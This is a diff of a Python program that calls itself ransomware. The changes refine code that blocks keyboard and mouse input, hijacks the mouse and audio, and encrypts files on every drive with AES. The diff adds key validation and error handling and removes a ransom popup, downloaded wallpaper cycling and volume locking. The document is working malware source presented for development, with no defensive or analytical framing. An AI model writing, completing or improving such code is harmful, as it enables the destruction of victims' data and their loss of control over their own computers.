@@ -10,6 +10,8 @@ from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 import tkinter as tk
 from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
+from tkinter.simpledialog import askstring
+
 
 # Global encryption key (initially empty, to be provided by user later)
 encryption_key = None
@@ -18,12 +20,15 @@ encryption_key = None
 def slow_down_mouse():
     while True:
         x, y = pyautogui.position()
-        pyautogui.moveTo(x/10, y/10)
+        pyautogui.moveTo(x/5, y/5)  # Adjust factor for better usability
         time.sleep(0.1)
 
 # Disable critical system functionalities (Ctrl+Alt+Del, Task Manager, CMD, etc.)
 def block_system_functions():
-    ctypes.windll.user32.BlockInput(True)  # Blocks all keyboard and mouse input
+    try:
+        ctypes.windll.user32.BlockInput(True)  # Blocks all keyboard and mouse input
+    except Exception as e:
+        print(f"Error blocking input: {e}")
 
 # Function to get all drives (for Windows)
 def get_drives():
@@ -36,9 +41,12 @@ def get_drives():
 
 # Function to download files from a URL
 def download_file(url, save_path):
-    response = requests.get(url)
-    with open(save_path, 'wb') as file:
-        file.write(response.content)
+    try:
+        response = requests.get(url)
+        with open(save_path, 'wb') as file:
+            file.write(response.content)
+    except Exception as e:
+        print(f"Error downloading file from {url}: {e}")
 
 # Function to encrypt a single file
 def encrypt_file(file_path, key):
@@ -106,40 +114,6 @@ def handle_decryption(input_key):
     except Exception as e:
         messagebox.showerror("Error", f"Decryption failed: {e}")
 
-# Create the ransom popup
-def show_ransom_popup():
-    global root
-    root = tk.Tk()
-    root.title("Ransomware Attack!")
-
-    # Ransom message
-    ransom_message = tk.Label(root, text="Your files have been encrypted!\nEnter the decryption key to recover them.")
-    ransom_message.pack(pady=20)
-
-    # Input field for decryption key
-    decryption_key_input = tk.Entry(root, show="*")  # Hidden input for key
-    decryption_key_input.pack(pady=10)
-
-    # Button to submit the decryption key
-    submit_button = tk.Button(root, text="Submit", command=lambda: handle_decryption(decryption_key_input.get()))
-    submit_button.pack(pady=10)
-
-    root.geometry("400x200")
-    root.mainloop()
-
-# Main function to start the encryption and ransom process
-# Wallpaper cycling
-def set_wallpaper(image_path):
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
-
-def change_wallpapers(image_urls):
-    while True:
-        for idx, url in enumerate(image_urls):
-            save_path = f"wallpaper_{idx}.jpg"
-            download_file(url, save_path)
-            set_wallpaper(save_path)
-            time.sleep(30)  # Change every 30 seconds
-
 # Play music
 def play_music(music_urls):
     pygame.mixer.init()
@@ -153,27 +127,30 @@ def play_music(music_urls):
                 pygame.mixer.music.set_volume(1.0)
                 time.sleep(1)
 
-# Prevent volume reduction
-def prevent_volume_reduction():
-    while True:
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(
-            ISimpleAudioVolume._iid_, ctypes.CLSCTX_ALL, None)
-        volume = ctypes.cast(interface, ctypes.POINTER(ISimpleAudioVolume))
-        volume.SetMasterVolume(1.0, None)
-        time.sleep(1)
+# Main function to start the encryption and ransom process
+# Check if the decryption key is a valid hex string of 32 characters
+def is_valid_hex(s):
+    return len(s) == 32 and all(c in '0123456789abcdefABCDEF' for c in s)
 
-# Start the ransomware
+# Main function to start the encryption and ransom process
 def start_ransomware():
     global encryption_key, drives
 
-    # Ask user to set a decryption key
-    decryption_key = input("Set your decryption key (hex): ")
-    encryption_key = bytes.fromhex(decryption_key)
+    root = tk.Tk()
+    root.withdraw()
 
-    # Encrypt all files
+    # Ask for the encryption key
+    decryption_key = askstring("Decryption Key", "Set your decryption key (hex, 32 characters):")
+    if not decryption_key or not is_valid_hex(decryption_key):
+        print("Invalid key. The key must be a 32-character hex string. Exiting...")
+        return
+
+    encryption_key = bytes.fromhex(decryption_key)
     drives = get_drives()
     encrypt_all_files(drives, encryption_key)
+
+    # The rest of your code...
+
 
     # URLs for wallpapers and songs
     wallpaper_urls = [
